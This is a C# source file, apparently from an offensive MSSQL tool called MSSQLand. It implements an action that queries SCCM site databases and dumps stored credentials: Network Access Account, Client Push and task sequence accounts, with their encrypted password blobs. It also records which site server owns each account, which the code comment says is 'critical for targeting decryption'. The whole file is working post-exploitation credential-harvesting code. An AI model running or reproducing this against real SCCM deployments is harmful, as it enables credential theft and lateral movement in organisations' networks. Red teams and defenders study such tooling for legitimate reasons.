using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;

namespace MSSQLand.Actions.SCCM
{
    /// <summary>
    /// Enumerate SCCM stored credentials including Network Access Account (NAA), Client Push accounts, and task sequence accounts.
    /// Shows which site server owns each account - critical for targeting decryption.
    /// </summary>
    internal class SccmAccounts : BaseAction
    {
        public override void ValidateArguments(string[] args)
        {
            // No arguments required
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested("Enumerating SCCM stored credentials");

            SccmService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            string[] requiredTables = { "SC_UserAccount", "SC_SiteDefinition" };
            var databases = sccmService.GetValidatedSccmDatabases(requiredTables, 1);

            if (databases.Count == 0)
            {
                Logger.Warning("No SCCM databases found");
                return null;
            }

            foreach (string db in databases)
            {
                string siteCode = SccmService.GetSiteCode(db);

                Logger.NewLine();
                Logger.Info($"SCCM database: {db} (Site Code: {siteCode})");

                string query = $@"
SELECT
    ua.UserName,
    ua.Usage,
    sd.SiteCode,
    sd.SiteServerName,
    CONVERT(VARCHAR(MAX), ua.Password, 1) AS Password
FROM [{db}].dbo.SC_UserAccount ua
LEFT JOIN [{db}].dbo.SC_SiteDefinition sd ON ua.SiteNumber = sd.SiteNumber
ORDER BY ua.UserName;
";

                DataTable result = databaseContext.QueryService.ExecuteTable(query);

                if (result.Rows.Count == 0)
                {
                    Logger.Warning("No stored credentials found");
                    continue;
                }

                Logger.Success($"Found {result.Rows.Count} stored credential(s)");
                Console.WriteLine(OutputFormatter.ConvertDataTable(result));
            }

            Logger.Success("Credential enumeration completed");
            return null;
        }
    }
}
